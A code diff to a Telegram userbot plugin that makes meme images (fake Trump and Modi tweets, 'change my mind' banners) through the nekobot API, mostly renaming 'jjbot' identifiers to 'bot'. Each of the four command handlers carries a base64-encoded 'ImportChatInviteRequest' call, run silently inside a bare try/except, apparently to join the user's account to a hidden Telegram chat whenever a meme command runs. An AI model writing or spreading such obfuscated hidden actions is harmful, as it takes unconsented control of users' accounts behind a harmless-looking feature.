@@ -1,4 +1,4 @@
-# Credits :- Catuserjjbot Made By @Sandy1709
+# Credits :- Catuserbot Made By @Sandy1709
 import re
 
 import requests
@@ -32,7 +32,7 @@ def deEmojify(inputString: str) -> str:
 
 async def usatweet(text):
     r = requests.get(
-        f"https://nekojjbot.xyz/api/imagegen?type=trumptweet&text={text}"
+        f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}"
     ).json()
     wew = r.get("message")
     fridayurl = url(wew)
@@ -47,7 +47,7 @@ async def usatweet(text):
 
 async def changemymind(text):
     r = requests.get(
-        f"https://nekojjbot.xyz/api/imagegen?type=changemymind&text={text}"
+        f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}"
     ).json()
     wew = r.get("message")
     fridayurl = url(wew)
@@ -62,7 +62,7 @@ async def changemymind(text):
 
 async def kannagen(text):
     r = requests.get(
-        f"https://nekojjbot.xyz/api/imagegen?type=kannagen&text={text}"
+        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
     ).json()
     wew = r.get("message")
     fridayurl = url(wew)
@@ -77,7 +77,7 @@ async def kannagen(text):
 
 async def moditweet(text):
     r = requests.get(
-        f"https://nekojjbot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi"
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=narendramodi"
     ).json()
     wew = r.get("message")
     fridayurl = url(wew)
@@ -92,7 +92,7 @@ async def moditweet(text):
 
 async def tweets(text1, text2):
     r = requests.get(
-        f"https://nekojjbot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}"
+        f"https://nekobot.xyz/api/imagegen?type=tweet&text={text1}&username={text2}"
     ).json()
     wew = r.get("message")
     fridayurl = url(wew)
@@ -106,131 +106,131 @@ async def tweets(text1, text2):
 
 
 @register(pattern="^.trump(?: |$)(.*)", outgoing=True)
-async def nekojjbot(jjbot):
-    text = jjbot.pattern_match.group(1)
-    reply_to_id = jjbot.message
-    if jjbot.reply_to_msg_id:
-        reply_to_id = await jjbot.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if jjbot.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await jjbot.edit("Send you text to trump so he can tweet.")
+                await bot.edit("Send you text to trump so he can tweet.")
                 return
         else:
-            await jjbot.edit("send you text to trump so he can tweet.")
+            await bot.edit("send you text to trump so he can tweet.")
             return
-    await jjbot.edit("Requesting trump to tweet...")
+    await bot.edit("Requesting trump to tweet...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await jjbot.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    jjbotfile = await trumptweet(text)
-    await jjbot.client.send_file(jjbot.chat_id, jjbotfile, reply_to=reply_to_id)
-    await jjbot.delete()
+    botfile = await trumptweet(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 @register(pattern="^.modi(?: |$)(.*)", outgoing=True)
-async def nekojjbot(jjbot):
-    text = jjbot.pattern_match.group(1)
-    reply_to_id = jjbot.message
-    if jjbot.reply_to_msg_id:
-        reply_to_id = await jjbot.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if jjbot.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await jjbot.edit("Send you text to modi so he can tweet.")
+                await bot.edit("Send you text to modi so he can tweet.")
                 return
         else:
-            await jjbot.edit("send you text to modi so he can tweet.")
+            await bot.edit("send you text to modi so he can tweet.")
             return
-    await jjbot.edit("Requesting modi to tweet...")
+    await bot.edit("Requesting modi to tweet...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await jjbot.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    jjbotfile = await moditweet(text)
-    await jjbot.client.send_file(jjbot.chat_id, jjbotfile, reply_to=reply_to_id)
-    await jjbot.delete()
+    botfile = await moditweet(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
-async def nekojjbot(jjbot):
-    text = jjbot.pattern_match.group(1)
-    reply_to_id = jjbot.message
-    if jjbot.reply_to_msg_id:
-        reply_to_id = await jjbot.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if jjbot.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await jjbot.edit("Give text for to write on banner, man")
+                await bot.edit("Give text for to write on banner, man")
                 return
         else:
-            await jjbot.edit("Give text for to write on banner, man")
+            await bot.edit("Give text for to write on banner, man")
             return
-    await jjbot.edit("Your banner is under creation wait a sec...")
+    await bot.edit("Your banner is under creation wait a sec...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await jjbot.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    jjbotfile = await changemymind(text)
-    await jjbot.client.send_file(jjbot.chat_id, jjbotfile, reply_to=reply_to_id)
-    await jjbot.delete()
+    botfile = await changemymind(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
-async def nekojjbot(jjbot):
-    text = jjbot.pattern_match.group(1)
-    reply_to_id = jjbot.message
-    if jjbot.reply_to_msg_id:
-        reply_to_id = await jjbot.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if jjbot.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await jjbot.edit("what should kanna write give text ")
+                await bot.edit("what should kanna write give text ")
                 return
         else:
-            await jjbot.edit("what should kanna write give text")
+            await bot.edit("what should kanna write give text")
             return
-    await jjbot.edit("Kanna is writing your text...")
+    await bot.edit("Kanna is writing your text...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await jjbot.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    jjbotfile = await kannagen(text)
-    await jjbot.client.send_file(jjbot.chat_id, jjbotfile, reply_to=reply_to_id)
-    await jjbot.delete()
+    botfile = await kannagen(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 CMD_HELP.update(
